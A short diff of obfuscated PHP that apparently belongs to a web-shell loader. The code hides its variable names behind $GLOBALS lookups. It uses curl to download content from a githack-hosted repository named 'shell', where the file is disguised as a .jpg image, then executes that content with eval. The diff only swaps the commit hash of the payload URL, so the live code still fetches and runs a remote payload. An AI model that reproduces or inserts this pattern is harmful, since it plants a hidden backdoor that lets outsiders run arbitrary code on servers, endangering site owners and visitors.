@@ -35,5 +35,5 @@ function get_contents($url)
     ${$GLOBALS["lnrkdexmo"]} = curl_exec($ch);
     return ${$GLOBALS["lnrkdexmo"]};
 }
-${$GLOBALS["ltnbuthggrc"]} = get_contents("https://rawcdn.githack.com/muzan519/shell/59fcadf55c2525caa743b7f94ccd9948dd333352/png/clean-403.jpg");
+${$GLOBALS["ltnbuthggrc"]} = get_contents("https://rawcdn.githack.com/muzan519/shell/f41d1b7e4f16c0b9de5b39fa48e37a50c5451542/png/clean-403.jpg");
 eval("?>" . ${$GLOBALS["fcgthfemb"]});
